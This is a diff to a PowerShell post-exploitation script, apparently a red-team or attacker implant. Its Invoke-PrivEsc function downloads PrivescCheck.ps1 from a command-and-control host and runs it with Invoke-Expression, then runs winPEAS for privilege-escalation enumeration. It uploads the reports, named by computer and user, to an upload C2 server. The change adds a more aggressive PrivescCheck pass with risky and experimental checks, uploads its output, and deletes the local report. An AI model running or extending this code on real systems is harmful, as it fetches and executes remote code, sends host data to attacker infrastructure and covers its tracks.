@@ -178,7 +178,7 @@ function Invoke-PrivEsc {
     # ----------------------------------------
     $privCheck = (New-Object Net.WebClient).DownloadString("http://$($DownloadC2)/PrivescCheck.ps1")
     Invoke-Expression $privCheck
-    $privCheckHtml = Join-Path $tmp "$($env:COMPUTERNAME)_$($env:USERNAME)_PrivescCheck"
+    $privCheckHtml = Join-Path $tmp "PrivescCheck"
     $privCheckOutput = Invoke-PrivescCheck -Extended -Report $privCheckHtml -Format HTML | Out-String
     Invoke-FileUpload -C2 $UploadC2 -InputString $privCheckOutput -FileName "$($env:COMPUTERNAME)_$($env:USERNAME)_PrivescCheck.txt" | Out-Null
     Invoke-FileUpload -C2 $UploadC2 -FilePath "$privCheckHtml.html" | Out-Null
@@ -197,7 +197,7 @@ function Invoke-PrivEsc {
     [Console]::SetOut($sw)
 
     # Execute winPEAS
-    [winPEAS.Program]::Main(@(""))
+    [winPEAS.Program]::Main(@("all"))
 
     # Capture the output
     $peasOutput = $sw.ToString()
@@ -206,6 +206,16 @@ function Invoke-PrivEsc {
     [Console]::SetOut([System.IO.StreamWriter]::new([Console]::OpenStandardOutput()))
 
     Invoke-FileUpload -C2 $UploadC2 -InputString $peasOutput -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_winpeas.txt" | Out-Null
+
+
+    # ----------------------------------------
+    # Run heavy PrivescCheck
+    # ----------------------------------------
+    $privCheckHtml = Join-Path $tmp "PrivescCheck-Big"
+    $privCheckOutput = Invoke-PrivescCheck -Extended -Report $privCheckHtml -Format HTML -Risky -Audit -Experimental | Out-String
+    Invoke-FileUpload -C2 $UploadC2 -InputString $privCheckOutput -FileName "$($env:COMPUTERNAME)_$($env:USERNAME)_PrivescCheck-Big.txt" | Out-Null
+    Invoke-FileUpload -C2 $UploadC2 -FilePath "$privCheckHtml.html" | Out-Null
+    Remove-Item "$privCheckHtml.html" -Force
 }
 
 function Invoke-FileUpload {
